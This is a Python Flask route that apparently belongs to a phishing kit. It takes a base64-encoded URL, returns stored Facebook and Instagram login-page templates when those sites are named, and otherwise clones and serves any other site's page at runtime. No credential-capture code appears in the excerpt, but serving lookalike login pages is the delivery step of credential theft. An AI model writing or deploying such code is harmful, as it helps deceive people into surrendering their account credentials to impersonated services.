import os
import base64
import uuid
from browser_clone import render_and_save

@main.route('/clone/<encoded_url>')
def clone_page(encoded_url):
    try:
        url = base64.urlsafe_b64decode(encoded_url.encode()).decode()
    except Exception:
        return "Invalid URL encoding", 400

    # Serve template for Facebook or Instagram
    if "facebook.com" in url:
        template_path = os.path.join(os.path.dirname(__file__), '..', 'clone_template', 'facebook-login.html')
        if os.path.exists(template_path):
            with open(template_path, 'r', encoding='utf-8') as f:
                html = f.read()
            return html
    elif "instagram.com" in url:
        template_path = os.path.join(os.path.dirname(__file__), '..', 'clone_template', 'index.html')
        if os.path.exists(template_path):
            with open(template_path, 'r', encoding='utf-8') as f:
                html = f.read()
            return html

    # Otherwise, do the runtime clone as before
    clone_id = str(uuid.uuid4())
    clone_dir = os.path.join(os.path.dirname(__file__), 'clones', clone_id)
    os.makedirs(clone_dir, exist_ok=True)
    html_path, _ = render_and_save(url, clone_dir)
    with open(html_path, 'r', encoding='utf-8') as f:
        html = f.read()
    return html
